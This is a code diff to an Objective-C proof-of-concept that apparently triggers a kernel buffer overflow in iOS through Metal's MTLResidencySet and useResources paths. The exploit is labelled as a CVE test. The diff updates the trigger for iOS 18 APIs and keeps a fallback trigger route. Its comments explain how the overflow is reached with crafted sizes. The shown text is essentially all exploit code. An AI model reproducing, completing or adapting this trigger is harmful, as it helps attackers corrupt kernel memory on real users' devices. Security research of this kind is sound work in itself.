@@ -114,8 +114,8 @@ static void trigger_bof(id<MTLDevice> dev) {
     }
     evf("created %d resource buffers", (int)resources.count);
 
-    /* Step 2: Create MTLResidencySet (iOS 17+, maps to IOGPUResidentMemorySet) */
-    if (@available(iOS 17.0, *)) {
+    /* Step 2: Create MTLResidencySet (iOS 18+, maps to IOGPUResidentMemorySet) */
+    if (@available(iOS 18.0, *)) {
         MTLResidencySetDescriptor *desc = [[MTLResidencySetDescriptor alloc] init];
         desc.label = @"cve28882_test";
         desc.initialCapacity = 2; /* Start with minimal capacity (2 = inline threshold) */
@@ -132,12 +132,13 @@ static void trigger_bof(id<MTLDevice> dev) {
         evf("MTLResidencySet created");
 
         /* Step 3: Add legitimate resources first to warm up the array */
-        id<MTLResource> *arr = (id<MTLResource> *)alloca(resources.count * sizeof(id));
+        __unsafe_unretained id<MTLAllocation> *arr =
+            (__unsafe_unretained id<MTLAllocation> *)alloca(resources.count * sizeof(id));
         for (int i = 0; i < (int)resources.count; i++)
-            arr[i] = resources[i];
+            arr[i] = (id<MTLAllocation>)resources[i];
 
         /* Add small batch to grow beyond inline (2-element) threshold */
-        [rset addResources:arr count:MIN(4, (NSUInteger)resources.count)];
+        [rset addAllocations:arr count:MIN(4, (NSUInteger)resources.count)];
         [rset commit];
         evf("added 4 resources (grown beyond inline threshold)");
 
@@ -162,9 +163,8 @@ static void trigger_bof(id<MTLDevice> dev) {
          * we'd need direct IOUserClient access. Use indirect path via
          * MTLCommandEncoder useResources with crafted size. */
 
-    fallback_path:
-        /* Alternate trigger: MTLRenderCommandEncoder useResources
-         * This also calls into s_group_add_resources kernel path. */
+    fallback_path:;
+        /* Alternate trigger: MTLRenderCommandEncoder useResources */
         MTLRenderPassDescriptor *rpd = [MTLRenderPassDescriptor renderPassDescriptor];
         rpd.colorAttachments[0].loadAction  = MTLLoadActionClear;
         rpd.colorAttachments[0].storeAction = MTLStoreActionStore;
